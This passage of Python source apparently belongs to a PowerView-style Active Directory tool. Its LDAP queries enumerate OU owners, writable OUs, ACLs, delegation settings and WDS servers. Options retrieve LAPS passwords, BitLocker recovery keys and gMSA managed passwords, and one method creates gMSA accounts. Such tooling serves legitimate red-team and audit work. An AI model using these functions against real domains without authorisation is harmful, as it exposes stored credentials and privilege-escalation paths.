		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		ldapfilter = args.ldapfilter if hasattr(args, 'ldapfilter') and args.ldapfilter else None
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		if not searchbase:
			searchbase = self.root_dn
		
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		objects = self.get_domainobject(
			identity=identity,
			properties=[
				'cn',
				'nTSecurityDescriptor',
				'sAMAccountname',
				'objectSid',
				'distinguishedName',
			],
			searchbase=searchbase,
			ldap_filter=ldapfilter,
			sd_flag=0x01,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		for i in range(len(objects)):
			sd = objects[i].get('attributes', {}).get('nTSecurityDescriptor', None)
			if not sd:
				continue
			ownersid = None
			parser = ObjectOwner(objects[i])
			ownersid = parser.read()
			ownersid = "%s (%s)" % (self.convertfrom_sid(ownersid), ownersid)
			objects[i] = modify_entry(
				objects[i],
				new_attributes = {
					"Owner": ownersid
				},
				remove = [
					'nTSecurityDescriptor'
				]
			)

		return objects

	def get_domainou(self, args=None, properties=[], identity=None, searchbase=None, resolve_gplink=False, search_scope=ldap3.SUBTREE, sd_flag=None, writable=False, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'objectClass',
			'ou',
			'distinguishedName',
			'instanceType',
			'whenCreated',
			'whenChanged',
			'uSNCreated',
			'uSNChanged',
			'name',
			'objectGUID',
			'objectCategory',
			'gPLink',
			'dSCorePropagationData'
		]
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		writable = args.writable if hasattr(args, 'writable') and args.writable else writable
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		properties = set(properties or def_prop)
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		resolve_gplink = args.resolve_gplink if hasattr(args, 'resolve_gplink') and args.resolve_gplink else resolve_gplink
		ldap_filter = ""
		identity_filter = "" 

		if identity:
			identity_filter += f"(|(name={identity})(distinguishedName={identity}))"

		if writable:
			exclude_list = [
				"S-1-5-32-544",
				"S-1-5-18",
				"S-1-5-32-548",
				"S-1-5-32-550",
			]
			exclude_rids = [
				"-512",
				"-519",
				"-520",
				"-521",
			]
			relevant_rights = {
				"CreateChild": 0x00000001,
				"GenericAll": 0x10000000,
				"WriteDACL": 0x00040000,
				"WriteOwner": 0x00080000
			}
			relevant_object_types = {
				"00000000-0000-0000-0000-000000000000": "All Objects",
				"0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
			}

			properties.add('ntSecurityDescriptor')
			sd_flag = 0x07

			username = self.whoami.split('\\')[1] if "\\" in self.whoami else self.whoami
			entries = self.get_domainobject(ldap_filter=f"(sAMAccountName={username})", properties=['objectSid', 'memberOf'])
			if len(entries) == 0:
				logging.error(f"[Add-DomainCATemplateAcl] Current user {username} not found")
				return False
			elif len(entries) > 1:
				logging.error(f"[Add-DomainCATemplateAcl] More than one current user {username} found")
				return False

			current_user_sid = entries[0].get("attributes", {}).get("objectSid")
			if current_user_sid in exclude_list:
				exclude_list.remove(current_user_sid)
			current_user_rid = f"-{current_user_sid.split('-')[-1]}"
			if current_user_rid in exclude_rids:
				exclude_rids.remove(current_user_rid)

			member_of = entries[0].get("attributes", {}).get("memberOf", [])
			if isinstance(member_of, str):
				member_of = [member_of]
			
			for group in member_of:
				group_entries = self.get_domainobject(ldap_filter=f"(distinguishedName={group})", properties=['objectSid'])
				for group_entry in group_entries:
					group_sid = group_entry.get("attributes", {}).get("objectSid")
					if group_sid in exclude_list:
						exclude_list.remove(group_sid)
					group_rid = f"-{group_sid.split('-')[-1]}"
					if group_rid in exclude_rids:
						exclude_rids.remove(group_rid)

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		
		if args:
			if args.gplink:
				ldap_filter += f"(gplink=*{args.gplink}*)"
			if args.ldapfilter:
				logging.debug(f'[Get-DomainOU] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f"{args.ldapfilter}"

		ldap_filter = f'(&(objectCategory=organizationalUnit){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainOU] LDAP search filter: {ldap_filter}')
		
		controls = security_descriptor_control(sdflags=sd_flag) if sd_flag is not None else None
		
		entries = self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=list(properties),
			paged_size = 1000,
			generator=True,
			search_scope=search_scope,
			controls=controls,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		writable_entries = []
		for entry in entries:
			is_writable = False
			if writable:
				logging.debug(f"[Get-DomainOU] Checking if {entry.get('attributes', {}).get('distinguishedName', None)} is writable")
				if 'nTSecurityDescriptor' not in list(entry['attributes'].keys()):
					continue

				sd_data = entry.get('attributes', {}).get('nTSecurityDescriptor', None)
				if not sd_data:
					continue

				sd_parser = AccessControl.parse_sd(sd_data, raw=True)
				for ace in sd_parser['Dacl']:
					trustee = ace['trustee']
					permissions = ace['permissions']
					if trustee in exclude_list:
						continue
					skip_trustee = False
					for rid in exclude_rids:
						if trustee.endswith(rid):
							skip_trustee = True
							break
					if skip_trustee:
						continue
					has_relevant_right = any(permissions & right_value for right_value in relevant_rights.values())
					if not has_relevant_right:
						continue
					is_writable = True
					break

				if "attributes" in entry:
					entry["attributes"].pop("nTSecurityDescriptor", None)

			if resolve_gplink:
				if len(entry['attributes']['gPLink']) == 0:
					continue
				gplinks = re.findall(r"(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})",entry["attributes"]["gPLink"],re.M)
				if gplinks:
					gplink_list = []
					for guid in [guids[0] for guids in gplinks]:
						gpo = self.get_domaingpo(identity=guid, properties=["displayName"])
						if len(gpo) == 0:
							logging.debug("[Get-DomainOU] gPLink not found. Cant resolve %s" % (guid))
						elif len(gpo) > 1:
							logging.debug("[Get-DomainOU] More than one gPLink found for %s. Ignoring..." % (guid))
						else:
							gplink_list.append("{} ({})".format(guid, gpo[0].get("attributes").get("displayName")))
					
					if len(gplink_list) != 0:
						entry["attributes"]["gPLink"] = gplink_list

			if writable:
				if is_writable:
					writable_entries.append(entry)
			else:
				writable_entries.append(entry)

		return writable_entries

	def get_domainobjectacl(self, identity=None, security_identifier=None, ldapfilter=None, resolveguids=False, guids_map_dict=None, searchbase=None, args=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		if args:
			identity = args.identity if hasattr(args, 'identity') else identity
			security_identifier = args.security_identifier if hasattr(args, 'security_identifier') else security_identifier
			searchbase = args.searchbase if hasattr(args, 'searchbase') else searchbase
			ldapfilter = args.ldapfilter if hasattr(args, 'ldapfilter') else ldapfilter
			no_cache = args.no_cache if hasattr(args, 'no_cache') else no_cache
			no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') else no_vuln_check
			raw = args.raw if hasattr(args, 'raw') else raw
			
		searchbase = searchbase or self.root_dn

		guids_dict = guids_map_dict or {}
		if not guids_map_dict:
			try:
				logging.debug(f"[Get-DomainObjectAcl] Searching for GUIDs in CN=Extended-Rights,{self.configuration_dn}")
				entries = self.ldap_session.extend.standard.paged_search(
					f"CN=Extended-Rights,{self.configuration_dn}", 
					"(rightsGuid=*)", 
					attributes=['displayName', 'rightsGuid'], 
					paged_size=1000, 
					generator=True, 
					search_scope=search_scope, 
					no_cache=no_cache, 
					no_vuln_check=no_vuln_check,
					raw=True
				)
				for entry in entries:
					rights_guid = entry['attributes'].get('rightsGuid')
					display_name = entry['attributes'].get('displayName')

					if isinstance(rights_guid, list) and rights_guid:
						rights_guid = rights_guid[0]
					if isinstance(display_name, list) and display_name:
						display_name = display_name[0]

					if rights_guid and display_name:
						guids_dict[rights_guid] = display_name
			except ldap3.core.exceptions.LDAPOperationResult:
				logging.error(f"[Get-DomainObjectAcl] Error searching for GUIDs in {searchbase}. Ignoring...")

		principal_SID = None
		if security_identifier:
			principalsid_entry = self.get_domainobject(
				identity=security_identifier, 
				properties=['objectSid'], 
				no_cache=no_cache, 
				searchbase=searchbase, 
				no_vuln_check=no_vuln_check,
				raw=raw
			)
			
			if not principalsid_entry:
				logging.debug('[Get-DomainObjectAcl] Principal not found. Searching in Well Known SIDs...')
				principal_SID = resolve_WellKnownSID(security_identifier)

				if principal_SID:
					principal_SID = principal_SID.get("objectSid")
					logging.debug(f"[Get-DomainObjectAcl] Found in well known SID: {principal_SID}")
				else:
					logging.error(f'[Get-DomainObjectAcl] Principal {security_identifier} not found. Try to use DN')
					return None
			elif len(principalsid_entry) > 1:
				logging.error('[Get-DomainObjectAcl] Multiple identities found. Use exact match')
				return None

			security_identifier = principalsid_entry[0]['attributes']['objectSid'] if not principal_SID else principal_SID

		target_dn = None
		if identity:
			identity_entries = self.get_domainobject(
				identity=identity, 
				properties=['objectSid', 'distinguishedName'], 
				searchbase=searchbase, 
				no_cache=no_cache, 
				no_vuln_check=no_vuln_check,
				raw=raw
			)
			
			if not identity_entries:
				logging.error(f'[Get-DomainObjectAcl] Identity {identity} not found. Try to use DN')
				return None
			elif len(identity_entries) > 1:
				logging.error('[Get-DomainObjectAcl] Multiple identities found. Use exact match')
				return None
			
			target_dn = identity_entries[0]["attributes"]["distinguishedName"]
			if isinstance(target_dn, list):
				target_dn = "".join(target_dn)
				
			logging.debug(f'[Get-DomainObjectAcl] Target identity found in domain {target_dn}')
			identity = target_dn
			logging.debug(f"[Get-DomainObjectAcl] Searching for identity {identity}")
		else:
			logging.warning('[Get-DomainObjectAcl] Recursing all domain objects. This might take a while')
			
		entries = self.get_domainobject(
			identity=identity, 
			properties=['nTSecurityDescriptor', 'sAMAccountName', 'distinguishedName', 'objectSid'], 
			searchbase=searchbase, 
			ldap_filter=ldapfilter,
			sd_flag=0x05,
			no_cache=no_cache, 
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		if not entries:
			logging.error('[Get-DomainObjectAcl] Identity not found in domain')
			return None

		enum = ACLEnum(self, entries, searchbase, resolveguids=resolveguids, targetidentity=identity, principalidentity=security_identifier, guids_map_dict=guids_dict)
		return enum.read_dacl()

	def get_domaincomputer(self, args=None, properties=[], identity=None, searchbase=None, resolveip=False, resolvesids=False, ldapfilter=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'objectClass',
			'lastLogonTimestamp',
			'objectCategory',
			'servicePrincipalName',
			'dNSHostName',
			'sAMAccountType',
			'sAMAccountName',
			'logonCount',
			'objectSid',
			'primaryGroupID',
			'pwdLastSet',
			'lastLogon',
			'lastLogoff',
			'badPasswordTime',
			'badPwdCount',
			'userAccountControl',
			'objectGUID',
			'name',
			'instanceType',
			'distinguishedName',
			'cn',
			'operatingSystem',
			'msDS-SupportedEncryptionTypes',
			'description'
		]
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		if args and hasattr(args, 'properties') and args.properties:
			properties = set(args.properties)
		else:
			properties = set(properties or def_prop)

		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		if not searchbase:
			searchbase = self.root_dn
		ldapfilter = args.ldapfilter if hasattr(args, 'ldapfilter') and args.ldapfilter else ldapfilter

		resolveip = args.resolveip if hasattr(args, 'resolveip') and args.resolveip else resolveip
		resolvesids = args.resolvesids if hasattr(args, 'resolvesids') and args.resolvesids else resolvesids
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		logging.debug(f"[Get-DomainComputer] Using search base: {searchbase}")
		
		ldap_filter = ""
		identity_filter = ""

		if identity:
			if is_dn(identity):
				identity_filter += f"(distinguishedName={identity})"
			else:
				identity_filter += f"(|(name={identity})(sAMAccountName={identity})(dnsHostName={identity})(cn={identity}))"

		if args:
			if hasattr(args, 'unconstrained') and args.unconstrained:
				logging.debug("[Get-DomainComputer] Searching for computers with unconstrained delegation")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=524288)'
			if hasattr(args, 'enabled') and args.enabled:
				logging.debug("[Get-DomainComputer] Searching for enabled computer")
				ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=2))'
			if hasattr(args, 'disabled') and args.disabled:
				logging.debug("[Get-DomainComputer] Searching for disabled computer")
				ldap_filter += f'(userAccountControl:1.2.840.113556.1.4.803:=2)'
			if hasattr(args, 'workstation') and args.workstation:
				logging.debug("[Get-DomainComputer] Searching for workstation")
				ldap_filter += f'(&(operatingSystem=*)(!(operatingSystem=*Server*)))'
			if hasattr(args, 'notworkstation') and args.notworkstation:
				logging.debug("[Get-DomainComputer] Searching for not workstation")
				ldap_filter += f'(&(operatingSystem=*)(operatingSystem=*Server*))'
			if hasattr(args, 'obsolete') and args.obsolete:
				logging.debug("[Get-DomainComputer] Searching for obsolete computer")
				obsolete_os_patterns = ['2000', 'Windows XP', 'Windows Server 2003', 'Windows Server 2008', 'Windows 7', 'Windows 8', 'Windows Server 2012']
				os_filter = '(|' + ''.join(f'(operatingSystem=*{pat}*)' for pat in obsolete_os_patterns) + ')'
				ldap_filter += os_filter
				properties.add('operatingSystem')
				properties.add('operatingSystemVersion')
			if hasattr(args, 'trustedtoauth') and args.trustedtoauth:
				logging.debug("[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals")
				ldap_filter += f'(msds-allowedtodelegateto=*)'
				properties.add('msds-AllowedToDelegateTo')
			if hasattr(args, 'laps') and args.laps:
				logging.debug("[Get-DomainComputer] Searching for computers with LAPS enabled")
				ldap_filter += f'(ms-Mcs-AdmPwd=*)'
				properties.add('ms-Mcs-AdmPwd')
				properties.add('ms-Mcs-AdmPwdExpirationTime')
			if hasattr(args, 'rbcd') and args.rbcd:
				logging.debug("[Get-DomainComputer] Searching for computers that are configured to allow resource-based constrained delegation")
				ldap_filter += f'(msDS-AllowedToActOnBehalfOfOtherIdentity=*)'
				properties.add('msDS-AllowedToActOnBehalfOfOtherIdentity')
			if hasattr(args, 'shadowcred') and args.shadowcred:
				logging.debug("[Get-DomainComputer] Searching for computers that are configured to have msDS-KeyCredentialLink attribute set")
				ldap_filter += f'(msDS-KeyCredentialLink=*)'
				properties.add('msDS-KeyCredentialLink')
			if hasattr(args, 'printers') and args.printers:
				logging.debug("[Get-DomainComputer] Searching for printers")
				ldap_filter += f'(objectCategory=printQueue)'
			if hasattr(args, 'spn') and args.spn:
				logging.debug(f"[Get-DomainComputer] Searching for computers with SPN attribute: {args.spn}")
				ldap_filter += f'(servicePrincipalName=*)'
			if hasattr(args, 'excludedcs') and args.excludedcs:
				logging.debug("[Get-DomainComputer] Excluding domain controllers")
				ldap_filter += f'(!(userAccountControl:1.2.840.113556.1.4.803:=8192))'
			if hasattr(args, 'bitlocker') and args.bitlocker:
				logging.debug("[Get-DomainComputer] Searching for computers with BitLocker keys")
				ldap_filter += f'(objectClass=msFVE-RecoveryInformation)'
				properties.add('msFVE-KeyPackage')
				properties.add('msFVE-RecoveryGuid')
				properties.add('msFVE-RecoveryPassword')
				properties.add('msFVE-VolumeGuid')
			if hasattr(args, 'gmsapassword') and args.gmsapassword:
				logging.debug("[Get-DomainComputer] Searching for computers with GSMA password stored")
				ldap_filter += f'(objectClass=msDS-GroupManagedServiceAccount)'
				properties.add('msDS-ManagedPassword')
				properties.add('msDS-GroupMSAMembership')
				properties.add('msDS-ManagedPasswordInterval')
				properties.add('msDS-ManagedPasswordId')
			if hasattr(args, 'pre2k') and args.pre2k:
				logging.debug("[Get-DomainComputer] Search for Pre-Created Windows 2000 computer")
				ldap_filter += f'(userAccountControl=4128)(logonCount=0)'
			if hasattr(args, 'ldapfilter') and args.ldapfilter:
				logging.debug(f'[Get-DomainComputer] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f"{args.ldapfilter}"

		ldap_filter = f'(&(objectClass=computer){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainComputer] LDAP search filter: {ldap_filter}')
		entries = self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=list(properties),
			paged_size = 1000,
			generator=True,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		for entry in entries:
			if resolveip and entry.get('attributes', {}).get('dnsHostName'):
				ip = host2ip(entry['attributes']['dnsHostName'], self.nameserver, 3, True, use_system_ns=self.use_system_nameserver, type=list, no_prompt=True)
				if ip and ip != entry.get('attributes', {}).get('dnsHostName'):
					entry['attributes']['IPAddress'] = ip
					logging.debug(f"[Get-DomainComputer] Resolved {entry['attributes']['dnsHostName']} to {ip}")
			
			try:
				if "msDS-AllowedToActOnBehalfOfOtherIdentity" in list(entry["attributes"].keys()):
					parser = RBCD(entry)
					sids = parser.read()
					if hasattr(args, 'resolvesids') and args.resolvesids:
						for i in range(len(sids)):
							sids[i] = self.convertfrom_sid(sids[i])
					entry["attributes"]["msDS-AllowedToActOnBehalfOfOtherIdentity"] = sids
			except:
				pass

			try:
				if "msDS-GroupMSAMembership" in list(entry["attributes"].keys()):
					entry["attributes"]["msDS-GroupMSAMembership"] = self.convertfrom_sid(entry["attributes"]["msDS-GroupMSAMembership"])
			except:
				pass

		return entries

	def get_domaingmsa(self, identity=None, properties=None, searchbase=None, args=None, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			"sAMAccountName",
			"objectSid",
			"dnsHostName",
			"msDS-GroupMSAMembership",
			"msDS-ManagedPassword"
		]

		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		if properties is None:
			properties = def_prop
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		entries = self.get_domainobject(
			identity=identity,
			properties=properties,
			ldap_filter="(&(objectClass=msDS-GroupManagedServiceAccount))",
			searchbase=searchbase,
			args=args,
			sd_flag=0x05,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		logging.debug("[Get-DomainGMSA] Found %d object(s) with gmsa attribute" % (len(entries)))
		for entry in entries:
			if entry.get("attributes",{}).get("msDS-GroupMSAMembership"):
				msds_group = entry["attributes"]["msDS-GroupMSAMembership"]
				if isinstance(msds_group, list):
					resolved_sids = []
					for sid in msds_group:
						resolved_sids.append(self.convertfrom_sid(sid))
					entry["attributes"]["msDS-GroupMSAMembership"] = resolved_sids
				else:
					entry["attributes"]["msDS-GroupMSAMembership"] = self.convertfrom_sid(msds_group)
		return entries

	def add_domaingmsa(self, identity=None, principals_allowed_to_retrieve_managed_password=None, dnshostname=None, basedn=None, args=None):
		identity = args.identity if args and hasattr(args, 'identity') and args.identity else identity
		dnshostname = args.dnshostname if args and hasattr(args, 'dnshostname') and args.dnshostname else dnshostname
		principals_allowed_to_retrieve_managed_password = args.principals_allowed_to_retrieve_managed_password if args and hasattr(args, 'principals_allowed_to_retrieve_managed_password') and args.principals_allowed_to_retrieve_managed_password else principals_allowed_to_retrieve_managed_password
		basedn = args.basedn if args and hasattr(args, 'basedn') and args.basedn else basedn

		if not identity:
			raise ValueError("[Add-DomainGMSA] -Identity is required")

		parent_dn_entries = f"CN=Managed Service Accounts,{self.root_dn}"
		if basedn:
			if is_dn(basedn):
				parent_dn_entries = basedn
			else:
				logging.warning(f"[Add-DomainGMSA] -Basedn is not a valid DN. Using default: {parent_dn_entries}")
				return False

		try:
			dmsa_attrs = {
				'objectClass': [
					'top',
					'person',
					'organizationalPerson',
					'user',
					'computer',
					'msDS-GroupManagedServiceAccount'
				],
				'objectCategory': f'CN=ms-DS-Group-Managed-Service-Account,{self.schema_dn}',
				'sAMAccountName': f"{identity}$" if not identity.endswith('$') else identity,
				'cn': identity,
				'userAccountControl': 0x1000,  # WORKSTATION_TRUST_ACCOUNT
				'dNSHostName': f"{identity}.{self.conn.get_domain()}" if not dnshostname else dnshostname,
				'msDS-ManagedPasswordInterval': 30,
				'msDS-SupportedEncryptionTypes': 28, # RC4-HMAC,AES128,AES256
			}

			if principals_allowed_to_retrieve_managed_password:
				principal_entries = self.get_domainobject(
					identity=principals_allowed_to_retrieve_managed_password,
					properties=['objectSid']
				)
				if len(principal_entries) == 0:
					logging.error(f"[Add-DomainGMSA] Principal {principals_allowed_to_retrieve_managed_password} not found")
					return False
				elif len(principal_entries) > 1:
					logging.error(f"[Add-DomainGMSA] More than one principal {principals_allowed_to_retrieve_managed_password} found")
					return False

				principal_sid = principal_entries[0].get("attributes", {}).get("objectSid")
				if not principal_sid:
					logging.error(f"[Add-DomainGMSA] Principal {principals_allowed_to_retrieve_managed_password} has no objectSid")
					return False

				msa_membership = MSA.create_msamembership(principal_sid)
				dmsa_attrs['msDS-GroupMSAMembership'] = msa_membership
			
			dmsa_dn = f"CN={identity},{parent_dn_entries}"
			logging.debug(f"[Add-DomainGMSA] Creating GMSA account at {dmsa_dn}")
			for attr in dmsa_attrs:
				logging.debug(f"{attr}:{dmsa_attrs[attr]}")
				
			result = self.ldap_session.add(
				dmsa_dn, 
				None,  
				dmsa_attrs
			)
			
			if not result:
				logging.error(f"[Add-DomainGMSA] Failed to create GMSA: {self.ldap_session.result}")
				return False
			
			logging.info(f"[Add-DomainGMSA] Successfully created GMSA account {identity}")
			return True
					
		except Exception as e:
			if self.args.stack_trace:
				raise e
			logging.error(f"[Add-DomainGMSA] Error creating GMSA: {str(e)}")
			return False 

	def remove_domaingmsa(self, identity=None, searchbase=None, args=None):
		identity = args.identity if args and hasattr(args, 'identity') and args.identity else identity
		searchbase = args.searchbase if args and hasattr(args, 'searchbase') and args.searchbase else searchbase
		if not identity:
			raise ValueError("[Remove-DomainGMSA] -Identity is required")

		if not is_dn(identity):
			logging.debug(f"[Remove-DomainGMSA] GMSA account {identity} is not a DN, searching for it")
			entries = self.get_domainobject(
				identity=identity,
				properties=[
					'objectSid',
					'distinguishedName'
				],
				searchbase=searchbase,
				args=args
			)
			if len(entries) == 0:
				logging.error(f"[Remove-DomainGMSA] GMSA account {identity} not found")
				return False
			elif len(entries) > 1:
				logging.error(f"[Remove-DomainGMSA] More than one GMSA account {identity} found")
				return False
			entry_dn = entries[0].get("attributes", {}).get("distinguishedName")
		else:
			entry_dn = identity

		if not entry_dn:
			logging.error(f"[Remove-DomainGMSA] GMSA account {identity} has no distinguished name")
			return False

		logging.warning(f"[Remove-DomainGMSA] Removing GMSA account {identity}")
		succeeded = self.ldap_session.delete(entry_dn)
		if not succeeded:
			logging.error(f"[Remove-DomainGMSA] Failed to remove GMSA account {identity}: {self.ldap_session.result}")
			return False

		logging.info(f"[Remove-DomainGMSA] Successfully removed GMSA account {identity}")
		return True

	def get_domainrbcd(self, identity=None, args=None, no_cache=False, no_vuln_check=False, raw=True):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = [
			"sAMAccountName",
			"sAMAccountType",
			"objectSID",
			"userAccountControl",
			"distinguishedName",
			"servicePrincipalName",
			"msDS-AllowedToActOnBehalfOfOtherIdentity"
		] 

		entries = []
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		# get source identity
		sourceObj = self.get_domainobject(
			identity=identity,
			properties=properties,
			searchbase=searchbase,
			ldap_filter="(msDS-AllowedToActOnBehalfOfOtherIdentity=*)",
			sd_flag=0x05,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		logging.debug("[Get-DomainRBCD] Found %d object(s) with msDS-AllowedToActOnBehalfOfOtherIdentity attribute" % (len(sourceObj)))

		if not sourceObj:
			return

		for source in sourceObj:
			entry = {
				"SourceName": None,
				"SourceType": None,
				"SourceSID": None,
				"SourceAccountControl": None,
				"SourceDistinguishedName": None,
				"ServicePrincipalName": None,
				"DelegatedName": None,
				"DelegatedType": None,
				"DelegatedSID": None,
				"DelegatedAccountControl": None,
				"DelegatedDistinguishedName": None,
			}

			# resolve msDS-AllowedToActOnBehalfOfOtherIdentity
			parser = RBCD(source)
			sids = parser.read()

			source = source.get("attributes")
			entry["SourceName"] = source.get("sAMAccountName")
			entry["SourceType"] = source.get("sAMAccountType")
			entry["SourceSID"] = source.get("objectSid")
			entry["SourceAccountControl"] = source.get("userAccountControl")
			entry["SourceDistinguishedName"] = source.get("distinguishedName")
			entry["ServicePrincipalName"] = source.get("servicePrincipalName")

			for sid in sids:
				# resolve sid from delegateObj
				delegateObj = self.get_domainobject(identity=sid, properties=properties, searchbase=searchbase)
				if len(delegateObj) == 0:
					logging.warning("Delegated object not found. Ignoring...")
				elif len(delegateObj) > 1:
					logging.warning("More than one delegated object found. Ignoring...")

				for delegate in delegateObj:
					try:
						delegate = delegate.get("attributes")
						entry["DelegatedName"] = delegate.get("sAMAccountName")
						entry["DelegatedType"] = delegate.get("sAMAccountType")
						entry["DelegatedSID"] = delegate.get("objectSid")
						entry["DelegatedAccountControl"] = delegate.get("userAccountControl")
						entry["DelegatedDistinguishedName"] = delegate.get("distinguishedName")
					except IndexError:
						logging.error(f"[IndexError] No object found for {sid}")
						pass
				
				entries.append(
							{
								"attributes": dict(entry)
							}
						)
		return entries

	def get_domainwds(self, identity=None, properties=[], searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False, args=None):
		"""
		List WDS servers which can host Distribution Points or MDT shares.
		"""
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		logging.debug(f"[Get-DomainWDS] Using search base: {searchbase}")

		ldap_filter = ""
		identity_filter = ""

		if identity:
			identity_filter += f"(|(|(samAccountName={identity})(name={identity})(distinguishedName={identity})))"

		if args:
			if args.ldapfilter:
				ldap_filter += f"{args.ldapfilter}"
				logging.debug(f'[Get-DomainWDS] Using additional LDAP filter: {args.ldapfilter}')

		ldap_filter = f'(&(|(objectclass=intellimirrorSCP)(cn=*-Remote-Installation-Services)){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainWDS] LDAP search filter: {ldap_filter}')
		wds_servers = self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=[
				'netbootServer', 
				'netbootAllowNewClients', 
				'netbootAnswerOnlyValidClients', 
				'netbootAnswerRequests', 
				'netbootCurrentClientCount', 
				'netbootLimitClients', 
				'netbootMaxClients'
			], 
			paged_size=1000, 
			generator=True, 
			search_scope=search_scope, 
			no_cache=no_cache, 
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		if len(wds_servers) == 0:
			logging.debug("[Get-DomainWDS] No WDS servers found")
			return

		logging.debug(f"[Get-DomainWDS] Found {len(wds_servers)} object(s) with WDS attribute")

		entries = []
		for server in wds_servers:
			wds_dn = server.get("attributes", {}).get("netbootServer")

			if not wds_dn:
				continue

			entries.extend(self.get_domaincomputer(
				identity=wds_dn,
				properties=properties,
				searchbase=searchbase,
				no_cache=no_cache,
				no_vuln_check=no_vuln_check,
				raw=raw
			))
		return entries

	def get_domaingroup(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'adminCount',
			'cn',
			'description',
			'distinguishedName',
			'groupType',
			'instanceType',
			'member',
			'objectCategory',
			'objectGUID',
			'objectSid',
			'sAMAccountName',
			'sAMAccountType',
			'name'
		]

		properties = set(properties or def_prop)
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		logging.debug(f"[Get-DomainGroup] Using search base: {searchbase}")
		
		ldap_filter = ""
		identity_filter = ""

		if identity:
			if is_dn(identity):
				identity_filter += f"(distinguishedName={identity})"
			else:
				identity_filter += f"(|(|(samAccountName={identity})(name={identity})(cn={identity})))"

		if args:
			if args.admincount:
				ldap_filter += f"(admincount=1)"
			if args.ldapfilter:
				ldap_filter += f"{args.ldapfilter}"
				logging.debug(f'[Get-DomainGroup] Using additional LDAP filter: {args.ldapfilter}')
			if args.memberidentity:
				entries = self.get_domainobject(identity=args.memberidentity)
				if len(entries) == 0:
